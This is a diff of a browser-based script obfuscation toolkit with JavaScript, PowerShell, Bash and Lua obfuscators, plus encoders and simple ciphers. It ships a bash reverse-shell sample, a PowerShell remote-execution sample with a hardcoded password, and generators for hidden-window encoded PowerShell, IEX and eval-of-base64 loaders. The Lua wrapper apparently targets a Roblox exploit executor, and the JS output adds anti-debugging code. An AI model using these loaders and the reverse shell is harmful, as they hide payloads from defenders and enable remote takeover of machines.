+  clearTimeout(_noticeTimers[id]);
+  _noticeTimers[id] = setTimeout(() => el.classList.remove('show'), 4000);
 }
 
-// ═══════════════════════════════════════════════
-// SAMPLES
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  SAMPLES
+// ══════════════════════════════════════════
 const jsSample = `function calculateDiscount(price, percent) {
   var discount = price * (percent / 100);
   var finalPrice = price - discount;
@@ -1684,19 +1787,13 @@ const jsSample = `function calculateDiscount(price, percent) {
   console.log(message);
   return finalPrice;
 }
-
 var items = ["apple", "banana", "cherry"];
-items.forEach(function(item) {
-  console.log("Processing: " + item);
-});`;
+items.forEach(function(item) { console.log("Processing: " + item); });`;
 
 const psSample = `$username = "admin"
 $password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($username, $password)
-Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
-  whoami
-  ipconfig /all
-}`;
+Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; ipconfig /all }`;
 
 const bashSample = `#!/bin/bash
 TARGET="192.168.1.1"
@@ -1706,32 +1803,25 @@ bash -i >& /dev/tcp/$TARGET/$PORT 0>&1`;
 const luaSample = `local function getPlayer(name)
   local players = game:GetService("Players")
   local target = players:FindFirstChild(name)
-  if target then
-    return target.Character
-  end
+  if target then return target.Character end
   return nil
 end
-
 local player = getPlayer("Idris")
-if player then
-  print("Found: " .. player.Name)
-end`;
+if player then print("Found: " .. player.Name) end`;
 
-// ═══════════════════════════════════════════════
-// JS OBFUSCATOR
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  OBFUSCATORS
+// ══════════════════════════════════════════
 function obfuscateJS() {
   const src = document.getElementById('js-in').value.trim();
-  if (!src) { notice('js-notice','notice-warn','No input.'); return; }
+  if (!src) { notice('js-notice', 'notice-warn', 'No input.'); return; }
   const opts = getOpts('js-opts');
   let out = src;
 
   if (opts.renameVars) {
-    const varNames = new Map();
-    let counter = 0;
+    const varNames = new Map(); let counter = 0;
     const genName = () => {
-      const chars = 'O0lI1';
-      let n = '', c = counter++;
+      const chars = 'O0lI1'; let n = '', c = counter++;
       do { n = chars[c % 5] + n; c = Math.floor(c / 5) - 1; } while (c >= 0);
       return '_' + n;
     };
@@ -1739,43 +1829,25 @@ function obfuscateJS() {
       if (!varNames.has(name)) varNames.set(name, genName());
       return kw + ' ' + varNames.get(name);
     });
-    varNames.forEach((newName, oldName) => {
-      out = out.replace(new RegExp('\\b' + oldName + '\\b', 'g'), newName);
-    });
+    varNames.forEach((nn, on) => { out = out.replace(new RegExp('\\b' + on + '\\b', 'g'), nn); });
   }
-
   if (opts.encodeStrings) {
-    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, inner) => {
-      const hex = Array.from(inner).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
-      return '"' + hex + '"';
-    });
-    out = out.replace(/'((?:[^'\\]|\\.)*)'/g, (m, inner) => {
-      const hex = Array.from(inner).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
-      return "'" + hex + "'";
-    });
+    const enc = s => Array.from(s).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, i) => '"' + enc(i) + '"')
+             .replace(/'((?:[^'\\]|\\.)*)'/g, (m, i) => "'" + enc(i) + "'");
   }
-
   if (opts.hexLiterals) {
-    out = out.replace(/\b(\d+)\b/g, (m, n) => {
-      const num = parseInt(n);
-      return num > 9 ? '0x' + num.toString(16) : m;
-    });
+    out = out.replace(/\b(\d+)\b/g, (m, n) => { const v = parseInt(n); return v > 9 ? '0x' + v.toString(16) : m; });
   }
-
   if (opts.deadCode) {
     const dead = ['if(0x0){void 0;}', 'var _d=function(){return false;}();', 'try{undefined();}catch(e){}'];
-    const lines = out.split('\n'), injected = [];
-    lines.forEach((line, i) => {
-      injected.push(line);
-      if (i % 5 === 2) injected.push(dead[i % dead.length]);
-    });
-    out = injected.join('\n');
+    const lines = out.split('\n'), inj = [];
+    lines.forEach((l, i) => { inj.push(l); if (i % 5 === 2) inj.push(dead[i % dead.length]); });
+    out = inj.join('\n');
   }
-
   if (opts.controlFlow) {
-    out = `(function(_0x){var _st='${btoa('arch').replace(/=/g,'')}';eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('${out.replace(/'/g,"\\'").replace(/\n/g,'\\n')}',0,0,''.split('|'),0,{}));})(this);`;
+    out = `(function(_0x){var _st='${btoa('arch').replace(/=/g, '')}';eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('${out.replace(/'/g, "\\'").replace(/\n/g, '\\n')}',0,0,''.split('|'),0,{}));})(this);`;
   }
-
   if (opts.selfDefend) {
     out = `(function(){var _x=function(){return true;};if(typeof _x!=='function'){(function(){}).constructor('debugger')();}(function(){var _y=new RegExp('(((.+)+)+)+$');_y.test('arch-hub');})();${out}})();`;
   }
@@ -1784,15 +1856,12 @@ function obfuscateJS() {
   const ratio = (out.length / src.length).toFixed(2) + 'x';
   document.getElementById('js-ratio').textContent = ratio;
   document.getElementById('js-stats').style.display = '';
-  notice('js-notice','notice-ok','Obfuscated — ' + src.length + ' → ' + out.length + ' chars');
+  notice('js-notice', 'notice-ok', `Obfuscated — ${src.length} → ${out.length} chars`);
 }
 
-// ═══════════════════════════════════════════════
-// POWERSHELL OBFUSCATOR
-// ═══════════════════════════════════════════════
 function obfuscatePS() {
   const src = document.getElementById('ps-in').value.trim();
-  if (!src) { notice('ps-notice','notice-warn','No input.'); return; }
+  if (!src) { notice('ps-notice', 'notice-warn', 'No input.'); return; }
   const method = document.getElementById('ps-method').value;
   let out = '';
 
@@ -1800,48 +1869,48 @@ function obfuscatePS() {
     out = src.replace(/([a-zA-Z]{2,})/g, m => {
       if (m.length < 3) return m;
       let r = '';
-      for (let i = 0; i < m.length; i++) {
-        r += m[i];
-        if (i > 0 && i < m.length-1 && Math.random() > 0.6) r += '`';
-      }
+      for (let i = 0; i < m.length; i++) { r += m[i]; if (i > 0 && i < m.length - 1 && Math.random() > 0.6) r += '`'; }
       return r;
     });
   } else if (method === 'char') {
     const chars = Array.from(src).map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
     out = `& ([scriptblock]::Create(${chars}))`;
   } else if (method === 'b64') {
-    const encoded = btoa(unescape(encodeURIComponent(src)));
-    out = `powershell.exe -NoProfile -NonInteractive -EncodedCommand ${encoded}`;
-    out += `\n\n# IEX variant:\n$e="${encoded}";IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e)))`;
+    // ✅ FIXED: UTF-16LE encoding required by PowerShell -EncodedCommand
+    const buf = new Uint8Array(src.length * 2);
+    for (let i = 0; i < src.length; i++) {
+      const c = src.charCodeAt(i);
+      buf[i * 2]     = c & 0xFF;
+      buf[i * 2 + 1] = c >> 8;
+    }
+    let bin = '';
+    buf.forEach(b => bin += String.fromCharCode(b));
+    const encoded = btoa(bin);
+    out = `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}\n\n# IEX variant:\n$e="${encoded}"\n$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))\nIEX $d`;
   } else if (method === 'caserand') {
     out = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
   } else {
+    // combo
     let step = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
     step = step.replace(/([a-zA-Z]{3,})/g, m => {
       if (m.length < 4) return m;
       const mid = Math.floor(m.length / 2);
-      return `("${m.slice(0,mid)}"+"${m.slice(mid)}")`;
+      return `("${m.slice(0, mid)}"+"${m.slice(mid)}")`;
     });
     out = step.replace(/([a-zA-Z]{2,})/g, m => {
       let r = '';
-      for (let i = 0; i < m.length; i++) {
-        r += m[i];
-        if (i > 0 && i < m.length-1 && Math.random() > 0.65) r += '`';
-      }
+      for (let i = 0; i < m.length; i++) { r += m[i]; if (i > 0 && i < m.length - 1 && Math.random() > 0.65) r += '`'; }
       return r;
     });
   }
 
   document.getElementById('ps-out').value = out;
-  notice('ps-notice','notice-ok','Done — method: ' + method);
+  notice('ps-notice', 'notice-ok', `Done — method: ${method}`);
 }
 
-// ═══════════════════════════════════════════════
-// BASH OBFUSCATOR
-// ═══════════════════════════════════════════════
 function obfuscateBash() {
   const src = document.getElementById('bash-in').value.trim();
-  if (!src) { notice('bash-notice','notice-warn','No input.'); return; }
+  if (!src) { notice('bash-notice', 'notice-warn', 'No input.'); return; }
   const method = document.getElementById('bash-method').value;
   let out = '';
 
@@ -1849,215 +1918,146 @@ function obfuscateBash() {
     const encoded = btoa(unescape(encodeURIComponent(src)));
     out = `#!/bin/bash\neval "$(echo '${encoded}' | base64 --decode)"`;
   } else if (method === 'hex') {
-    const octals = Array.from(src).map(c => '\\0' + c.charCodeAt(0).toString(8).padStart(3,'0')).join('');
-    out = `#!/bin/bash\neval "$(printf '${octals}')"`;
+    const oct = Array.from(src).map(c => '\\0' + c.charCodeAt(0).toString(8).padStart(3, '0')).join('');
+    out = `#!/bin/bash\neval "$(printf '${oct}')"`;
   } else if (method === 'varsplit') {
-    const words = src.split(/\s+/);
-    let varDecls = '', call = '';
-    words.forEach((w, i) => { varDecls += `_v${i}="${w}"\n`; call += `$_v${i} `; });
-    out = `#!/bin/bash\n${varDecls}\n${call.trim()}`;
+    const words = src.split(/\s+/); let vd = '', call = '';
+    words.forEach((w, i) => { vd += `_v${i}="${w}"\n`; call += `$_v${i} `; });
+    out = `#!/bin/bash\n${vd}\n${call.trim()}`;
   } else {
-    const cmd = src.split('\n')[0].replace('#!/bin/bash','').trim();
-    if (cmd) {
-      out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c=>'\\x'+c.charCodeAt(0).toString(16)).join('')}')\neval "$_x"`;
-    } else { out = src; }
+    const cmd = src.split('\n')[0].replace('#!/bin/bash', '').trim();
+    if (cmd) out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c => '\\x' + c.charCodeAt(0).toString(16)).join('')}')\neval "$_x"`;
+    else out = src;
   }
 
   document.getElementById('bash-out').value = out;
-  notice('bash-notice','notice-ok','Done — method: ' + method);
+  notice('bash-notice', 'notice-ok', `Done — method: ${method}`);
 }
 
-// ═══════════════════════════════════════════════
-// LUA OBFUSCATOR (FIXED UTF-8 & MULTIBYTE)
-// ═══════════════════════════════════════════════
 function obfuscateLua() {
   const src = document.getElementById('lua-in').value.trim();
-  if (!src) { notice('lua-notice','notice-warn','No input.'); return; }
+  if (!src) { notice('lua-notice', 'notice-warn', 'No input.'); return; }
   const opts = getOpts('lua-opts');
   let out = src;
 
-  // 1. Strip comments (protects long-bracket strings first)
   if (opts.stripComments) {
-    const longStrings = [];
-    out = out.replace(/\[(=*)\[([\s\S]*?)\]\1\]/g, (m) => {
-      longStrings.push(m);
-      return '\u0000L' + (longStrings.length - 1) + '\u0000';
-    });
-    out = out.replace(/--\[(=*)\[[\s\S]*?\]\1\]/g, '');
-    out = out.replace(/--[^\n]*/g, '');
-    out = out.replace(/\u0000L(\d+)\u0000/g, (m, i) => longStrings[parseInt(i)]);
+    const ls = [];
+    out = out.replace(/\[(=*)\[([\s\S]*?)\]\1\]/g, m => { ls.push(m); return '\u0000L' + (ls.length - 1) + '\u0000'; });
+    out = out.replace(/--\[(=*)\[[\s\S]*?\]\1\]/g, '').replace(/--[^\n]*/g, '')
+             .replace(/\u0000L(\d+)\u0000/g, (m, i) => ls[parseInt(i)]);
   }
-
-  // 2. Rename locals
   if (opts.renameLocals) {
-    const localNames = new Map();
-    let ctr = 0;
-    const gen = () => { ctr++; return '_0x' + Math.random().toString(16).slice(2, 8); };
-
-    out = out.replace(/\blocal\s+function\s+([a-zA-Z_]\w*)/g, (m, name) => {
-      if (!localNames.has(name)) localNames.set(name, gen());
-      return 'local function ' + localNames.get(name);
+    const ln = new Map();
+    const gen = () => '_0x' + Math.random().toString(16).slice(2, 8);
+    out = out.replace(/\blocal\s+function\s+([a-zA-Z_]\w*)/g, (m, n) => {
+      if (!ln.has(n)) ln.set(n, gen()); return 'local function ' + ln.get(n);
     });
-    out = out.replace(/\blocal\s+(?!function\b)([a-zA-Z_]\w*(?:\s*,\s*[a-zA-Z_]\w*)*)/g, (m, names) => {
-      const renamed = names.split(',').map(n => {
-        const t = n.trim();
-        if (!localNames.has(t)) localNames.set(t, gen());
-        return localNames.get(t);
-      }).join(', ');
-      return 'local ' + renamed;
-    });
-    out = out.replace(/(\bfunction\s+[a-zA-Z_]\w*\s*\()([^)]*)(\))/g, (m, pre, params, post) => {
-      const renamed = params.split(',').map(p => {
-        const t = p.trim();
-        if (!t || !/^[a-zA-Z_]\w*$/.test(t)) return p;
-        if (!localNames.has(t)) localNames.set(t, gen());
-        return localNames.get(t);
-      }).join(', ');
-      return pre + renamed + post;
-    });
-
-    localNames.forEach((newName, oldName) => {
-      out = out.replace(new RegExp('\\b' + oldName + '\\b', 'g'), newName);
-    });
+    out = out.replace(/\blocal\s+(?!function\b)([a-zA-Z_]\w*(?:\s*,\s*[a-zA-Z_]\w*)*)/g, (m, names) =>
+      'local ' + names.split(',').map(n => { const t = n.trim(); if (!ln.has(t)) ln.set(t, gen()); return ln.get(t); }).join(', ')
+    );
+    ln.forEach((nn, on) => { out = out.replace(new RegExp('\\b' + on + '\\b', 'g'), nn); });
   }
-
-  // 3. Encode strings (FIXED: TextEncoder for UTF-8 support)
   if (opts.encodeStrings) {
-    const encodeString = (str) => {
-      if (str.length === 0) return '""';
-      // Use TextEncoder to get proper UTF-8 bytes (fixes Chinese characters)
-      const bytes = Array.from(new TextEncoder().encode(str));
-      // Convert each byte to \ddd format
+    const enc = s => {
+      if (!s.length) return '""';
+      const bytes = Array.from(new TextEncoder().encode(s));
       return '"' + bytes.map(b => '\\' + b.toString().padStart(3, '0')).join('') + '"';
     };
-
-    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, inner) => encodeString(inner));
-    out = out.replace(/'((?:[^'\\]|\\.)*)'/g, (m, inner) => {
-      if (inner.length === 0) return "''";
-      const bytes = Array.from(new TextEncoder().encode(inner));
-      return "'" + bytes.map(b => '\\' + b.toString().padStart(3, '0')).join('') + "'";
-    });
+    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, i) => enc(i))
+             .replace(/'((?:[^'\\]|\\.)*)'/g, (m, i) => {
+               if (!i.length) return "''";
+               const bytes = Array.from(new TextEncoder().encode(i));
+               return "'" + bytes.map(b => '\\' + b.toString().padStart(3, '0')).join('') + "'";
+             });
   }
-
-  // 4. Hex number literals
   if (opts.hexNumbers) {
-    out = out.replace(/\b(\d+)\b/g, (m, n) => {
-      const num = parseInt(n);
-      return num > 9 ? '0x' + num.toString(16) : m;
-    });
+    out = out.replace(/\b(\d+)\b/g, (m, n) => { const v = parseInt(n); return v > 9 ? '0x' + v.toString(16) : m; });
   }
-
-  // 5. Minify whitespace
   if (opts.minify) {
     const saved = [];
-    out = out.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, m => {
-      saved.push(m);
-      return '\u0000S' + (saved.length - 1) + '\u0000';
-    });
-    out = out.replace(/[ \t]+/g, ' ')
-             .replace(/\s*\n\s*/g, '\n')
-             .replace(/\n{2,}/g, '\n')
-             .trim();
+    out = out.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, m => { saved.push(m); return '\u0000S' + (saved.length - 1) + '\u0000'; });
+    out = out.replace(/[ \t]+/g, ' ').replace(/\s*\n\s*/g, '\n').replace(/\n{2,}/g, '\n').trim();
     out = out.replace(/\u0000S(\d+)\u0000/g, (m, i) => saved[parseInt(i)]);
   }
-
-  // 6. loadstring wrapper (using bytes is safe as long as it's valid UTF8, but string.char helps)
   if (opts.loadstring) {
     const bytes = Array.from(new TextEncoder().encode(out));
-    // For very large scripts, a single table may hit character limits. Delta usually handles it fine though.
-    const tableStr = '{' + bytes.join(',') + '}';
-    out = `local _t=${tableStr}\nlocal _s=''\nfor _,v in ipairs(_t) do _s=_s..string.char(v) end\nloadstring(_s)()`;
+    out = `local _t={${bytes.join(',')}}\nlocal _s=''\nfor _,v in ipairs(_t) do _s=_s..string.char(v) end\nloadstring(_s)()`;
   }
 
   document.getElementById('lua-out').value = out;
   const ratio = (out.length / src.length).toFixed(2) + 'x';
   document.getElementById('lua-ratio').textContent = ratio;
   document.getElementById('lua-stats').style.display = '';
-  notice('lua-notice','notice-ok','Obfuscated — ' + src.length + ' → ' + out.length + ' chars');
+  notice('lua-notice', 'notice-ok', `Obfuscated — ${src.length} → ${out.length} chars`);
 }
 
-// ═══════════════════════════════════════════════
-// BASE64
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  ENCODE / DECODE
+// ══════════════════════════════════════════
 function b64Encode() {
-  const val = document.getElementById('b64-in').value;
-  const urlSafe = document.getElementById('b64-variant').value === 'url';
+  const v = document.getElementById('b64-in').value;
+  const u = document.getElementById('b64-variant').value === 'url';
   try {
-    let enc = btoa(unescape(encodeURIComponent(val)));
-    if (urlSafe) enc = enc.replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
-    document.getElementById('b64-out').value = enc;
-  } catch(e) { notice('b64-notice','notice-err','Encoding failed: ' + e.message); }
+    let e = btoa(unescape(encodeURIComponent(v)));
+    if (u) e = e.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    document.getElementById('b64-out').value = e;
+  } catch(e) { notice('b64-notice', 'notice-err', 'Encoding failed: ' + e.message); }
 }
 function b64Decode() {
-  let val = document.getElementById('b64-in').value.trim();
-  const urlSafe = document.getElementById('b64-variant').value === 'url';
+  let v = document.getElementById('b64-in').value.trim();
+  const u = document.getElementById('b64-variant').value === 'url';
   try {
-    if (urlSafe) { val = val.replace(/-/g,'+').replace(/_/g,'/'); while (val.length % 4) val += '='; }
-    document.getElementById('b64-out').value = decodeURIComponent(escape(atob(val)));
-  } catch(e) { notice('b64-notice','notice-err','Decoding failed — invalid base64.'); }
+    if (u) { v = v.replace(/-/g, '+').replace(/_/g, '/'); while (v.length % 4) v += '='; }
+    document.getElementById('b64-out').value = decodeURIComponent(escape(atob(v)));
+  } catch(e) { notice('b64-notice', 'notice-err', 'Decoding failed — invalid base64.'); }
 }
 
-// ═══════════════════════════════════════════════
-// URL ENCODE
-// ═══════════════════════════════════════════════
 function urlEncode() {
-  const val = document.getElementById('url-in').value;
-  const mode = document.getElementById('url-mode').value;
+  const v = document.getElementById('url-in').value, mode = document.getElementById('url-mode').value;
   let out;
-  if (mode === 'component') out = encodeURIComponent(val);
-  else if (mode === 'full') {
-    out = Array.from(val).map(c => {
-      const code = c.charCodeAt(0);
-      if ((code >= 0x30 && code <= 0x39)||(code >= 0x41 && code <= 0x5A)||(code >= 0x61 && code <= 0x7A)||'-_.~'.includes(c)) return c;
-      return '%' + code.toString(16).toUpperCase().padStart(2,'0');
-    }).join('');
-  } else {
-    out = Array.from(encodeURIComponent(val)).map(c => c === '%' ? '%25' : c).join('');
-  }
+  if (mode === 'component') out = encodeURIComponent(v);
+  else if (mode === 'full') out = Array.from(v).map(c => {
+    const code = c.charCodeAt(0);
+    if ((code >= 0x30 && code <= 0x39) || (code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A) || '-_.~'.includes(c)) return c;
+    return '%' + code.toString(16).toUpperCase().padStart(2, '0');
+  }).join('');
+  else out = Array.from(encodeURIComponent(v)).map(c => c === '%' ? '%25' : c).join('');
   document.getElementById('url-out').value = out;
 }
 function urlDecode() {
   try { document.getElementById('url-out').value = decodeURIComponent(document.getElementById('url-in').value); }
-  catch(e) { notice('url-notice','notice-err','Decode failed — malformed percent encoding.'); }
+  catch(e) { notice('url-notice', 'notice-err', 'Decode failed — malformed percent encoding.'); }
 }
 
-// ═══════════════════════════════════════════════
-// HEX
-// ═══════════════════════════════════════════════
 function hexEncode() {
-  const val = document.getElementById('hex-in').value;
-  const sep = document.getElementById('hex-sep').value;
+  const v = document.getElementById('hex-in').value;
+  const sep   = document.getElementById('hex-sep').value;
   const upper = document.getElementById('hex-case').value === 'upper';
-  let bytes = Array.from(val).map(c => { let h = c.charCodeAt(0).toString(16).padStart(2,'0'); return upper ? h.toUpperCase() : h; });
+  const bytes = Array.from(v).map(c => { let h = c.charCodeAt(0).toString(16).padStart(2, '0'); return upper ? h.toUpperCase() : h; });
   let out;
-  if (sep === ' ') out = bytes.join(' ');
-  else if (sep === '') out = bytes.join('');
+  if      (sep === ' ')   out = bytes.join(' ');
+  else if (sep === '')    out = bytes.join('');
   else if (sep === '\\x') out = bytes.map(b => '\\x' + b).join('');
-  else out = bytes.map(b => '0x' + b).join(',');
+  else                    out = bytes.map(b => '0x' + b).join(',');
   document.getElementById('hex-out').value = out;
 }
 function hexDecode() {
-  let val = document.getElementById('hex-in').value.trim();
+  let v = document.getElementById('hex-in').value.trim();
   try {
-    val = val.replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
-    const bytes = val.split(' ');
-    document.getElementById('hex-out').value = bytes.map(b => String.fromCharCode(parseInt(b,16))).join('');
-  } catch(e) { notice('hex-notice','notice-err','Decode failed — check hex format.'); }
+    v = v.replace(/\\x/g, '').replace(/0x/gi, '').replace(/,/g, ' ').replace(/\s+/g, ' ').trim();
+    document.getElementById('hex-out').value = v.split(' ').map(b => String.fromCharCode(parseInt(b, 16))).join('');
+  } catch(e) { notice('hex-notice', 'notice-err', 'Decode failed — check hex format.'); }
 }
 
-// ═══════════════════════════════════════════════
-// HTML ENTITY
-// ═══════════════════════════════════════════════
-const HTML_NAMED = {'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;',"'":'&#x27;'};
+const HTML_NAMED = { '<':'&lt;', '>':'&gt;', '&':'&amp;', '"':'&quot;', "'":'&#x27;' };
 function htmlEncode() {
-  const val = document.getElementById('html-in').value;
-  const mode = document.getElementById('html-mode').value;
+  const v = document.getElementById('html-in').value, mode = document.getElementById('html-mode').value;
   let out;
-  if (mode === 'named') out = val.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
-  else if (mode === 'dec') out = val.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
-  else if (mode === 'hex') out = val.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
-  else if (mode === 'all-dec') out = Array.from(val).map(c => '&#' + c.charCodeAt(0) + ';').join('');
-  else out = Array.from(val).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
+  if      (mode === 'named')   out = v.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
+  else if (mode === 'dec')     out = v.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
+  else if (mode === 'hex')     out = v.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
+  else if (mode === 'all-dec') out = Array.from(v).map(c => '&#' + c.charCodeAt(0) + ';').join('');
+  else                         out = Array.from(v).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
   document.getElementById('html-out').value = out;
 }
 function htmlDecode() {
@@ -2066,11 +2066,11 @@ function htmlDecode() {
   document.getElementById('html-out').value = el.value;
 }
 
-// ═══════════════════════════════════════════════
-// XOR
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  CIPHERS
+// ══════════════════════════════════════════
 function getXorKey() {
-  const raw = document.getElementById('xor-key').value.trim();
+  const raw  = document.getElementById('xor-key').value.trim();
   const mode = document.getElementById('xor-keymode').value;
   if (mode === 'str') return Array.from(raw).map(c => c.charCodeAt(0));
   if (raw.startsWith('0x') || raw.startsWith('0X')) return [parseInt(raw, 16)];
@@ -2078,51 +2078,40 @@ function getXorKey() {
   return Array.from(raw).map(c => c.charCodeAt(0));
 }
 function xorProcess(dir) {
-  const keyArr = getXorKey();
-  const mode = document.getElementById('xor-keymode').value;
-  const outFmt = document.getElementById('xor-outfmt').value;
+  const keyArr = getXorKey(), mode = document.getElementById('xor-keymode').value, outFmt = document.getElementById('xor-outfmt').value;
   let inputBytes;
   if (dir === 'dec') {
-    const val = document.getElementById('xor-in').value.trim().replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
-    inputBytes = val.split(' ').map(b => parseInt(b, 16));
+    const v = document.getElementById('xor-in').value.trim().replace(/\\x/g, '').replace(/0x/gi, '').replace(/,/g, ' ').replace(/\s+/g, ' ').trim();
+    inputBytes = v.split(' ').map(b => parseInt(b, 16));
   } else {
     inputBytes = Array.from(document.getElementById('xor-in').value).map(c => c.charCodeAt(0));
   }
-  if (!inputBytes.length) { notice('xor-notice','notice-warn','No input.'); return; }
+  if (!inputBytes.length) { notice('xor-notice', 'notice-warn', 'No input.'); return; }
   const result = inputBytes.map((b, i) => {
     let k = mode === 'rolling' ? (keyArr[0] + i) & 0xFF : keyArr[i % keyArr.length];
     return b ^ k;
   });
   let out;
-  if (outFmt === 'hex') out = result.map(b => b.toString(16).padStart(2,'0')).join(' ');
+  if      (outFmt === 'hex') out = result.map(b => b.toString(16).padStart(2, '0')).join(' ');
   else if (outFmt === 'b64') out = btoa(result.map(b => String.fromCharCode(b)).join(''));
-  else out = result.map(b => String.fromCharCode(b)).join('');
+  else                       out = result.map(b => String.fromCharCode(b)).join('');
   document.getElementById('xor-out').value = out;
-  notice('xor-notice','notice-ok',`${dir === 'enc' ? 'Encrypted' : 'Decrypted'} ${inputBytes.length} bytes`);
+  notice('xor-notice', 'notice-ok', `${dir === 'enc' ? 'Encrypted' : 'Decrypted'} ${inputBytes.length} bytes`);
 }
 
-// ═══════════════════════════════════════════════
-// ROT
-// ═══════════════════════════════════════════════
 function rotApply() {
-  const val = document.getElementById('rot-in').value;
-  const n = parseInt(document.getElementById('rot-n').value) || 13;
-  const charset = document.getElementById('rot-charset').value;
+  const v  = document.getElementById('rot-in').value;
+  const n  = parseInt(document.getElementById('rot-n').value) || 13;
+  const cs = document.getElementById('rot-charset').value;
   let out;
-  if (charset === 'alpha') {
-    out = val.replace(/[a-zA-Z]/g, c => {
-      const base = c >= 'a' ? 97 : 65;
-      return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base);
-    });
+  if (cs === 'alpha') {
+    out = v.replace(/[a-zA-Z]/g, c => { const base = c >= 'a' ? 97 : 65; return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base); });
   } else {
-    out = val.replace(/[\x20-\x7e]/g, c => String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20));
+    out = v.replace(/[\x20-\x7e]/g, c => String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20));
   }
   document.getElementById('rot-out').value = out;
 }
 
-// ═══════════════════════════════════════════════
-// CAESAR
-// ═══════════════════════════════════════════════
 function caesarShift(text, shift) {
   shift = ((shift % 26) + 26) % 26;
   return text.replace(/[a-zA-Z]/g, c => {
@@ -2130,191 +2119,55 @@ function caesarShift(text, shift) {
     return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
   });
 }
-function caesarEnc() {
-  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, parseInt(document.getElementById('cae-shift').value) || 3);
-}
-function caesarDec() {
-  const shift = parseInt(document.getElementById('cae-shift').value) || 3;
-  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, 26 - shift);
-}
-function caesarBrute() {
-  const val = document.getElementById('cae-in').value;
-  let lines = '';
-  for (let i = 1; i <= 25; i++) lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(val, i)}\n`;
-  document.getElementById('cae-out').value = lines.trim();
-}
+function caesarEnc()   { document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, parseInt(document.getElementById('cae-shift').value) || 3); }
+function caesarDec()   { const shift = parseInt(document.getElementById('cae-shift').value) || 3; document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, 26 - shift); }
+function caesarBrute() { const v = document.getElementById('cae-in').value; let lines = ''; for (let i = 1; i <= 25; i++) lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(v, i)}\n`; document.getElementById('cae-out').value = lines.trim(); }
 
-// ═══════════════════════════════════════════════
-// HASH
-// ═══════════════════════════════════════════════
+// ══════════════════════════════════════════
+//  HASH
+// ══════════════════════════════════════════
 async function computeHashes() {
-  const val = document.getElementById('hash-in').value;
-  if (!val) return;
-  const enc = new TextEncoder(), data = enc.encode(val);
-  const algos = ['SHA-1','SHA-256','SHA-384','SHA-512'];
+  const v = document.getElementById('hash-in').value;
+  if (!v) return;
+  const enc = new TextEncoder(), data = enc.encode(v);
+  const algos = ['SHA-1', 'SHA-256', 'SHA-384', 'SHA-512'];
   const results = await Promise.all(algos.map(async a => {
     const buf = await crypto.subtle.digest(a, data);
-    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
     return { name: a, hex };
   }));
